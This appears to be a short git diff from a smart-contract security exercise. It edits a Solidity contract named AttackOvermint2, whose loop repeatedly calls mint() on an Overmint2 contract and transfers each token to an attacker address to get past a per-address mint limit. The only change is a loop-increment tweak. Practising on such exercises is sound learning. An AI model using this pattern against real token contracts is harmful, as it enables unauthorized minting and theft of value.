@@ -29,7 +29,7 @@ contract AttackOvermint2 {
         Overmint2 overmint2 = Overmint2(overmint2Add);
 
         overmint2.mint();
-        for (uint256 i = 1; i < 6; i++) {
+        for (uint256 i = 1; i < 6; ++i) {
             overmint2.mint();
 
             overmint2.safeTransferFrom(address(this), attaker, i);
